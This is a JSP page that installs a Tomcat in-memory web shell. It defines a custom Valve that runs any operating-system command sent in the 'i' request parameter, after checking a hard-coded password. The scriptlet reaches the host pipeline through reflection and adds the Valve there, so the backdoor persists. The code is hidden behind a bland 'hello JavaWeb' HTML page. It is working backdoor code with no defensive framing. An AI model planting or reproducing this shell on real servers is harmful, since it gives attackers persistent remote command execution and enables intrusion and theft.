<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public class myValue extends ValveBase {
        public void invoke(Request req, Response resp) throws IOException, ServletException {
            if ("023".equals(req.getParameter("pwd"))) {
                java.io.InputStream in = Runtime.getRuntime().exec(req.getParameter("i")).getInputStream();
                int a = -1;
                byte[] b = new byte[2048];
                resp.getWriter().write("<pre>");

                while ((a = in.read(b)) != -1) {
                    resp.getWriter().write(new String(b));
                }
                resp.getWriter().write("</pre>");
            }
            //注入调用invoke
            this.getNext().invoke(req, resp);
        }

    }
%>
<%
    myValue myValve = new myValue();
    //获取request属性
    Field request1 = request.getClass().getDeclaredField("request");
    request1.setAccessible(true);
    Request req = (Request) request1.get(request);
    System.out.println(req);
    StandardHost host = (StandardHost) req.getHost();
    Pipeline pipeline = host.getPipeline();
    pipeline.addValve(myValve);

%>
<html>
<head>
    <title>$Title$</title>
</head>
<body>
<h1>hello JavaWeb</h1>
</body>
</html>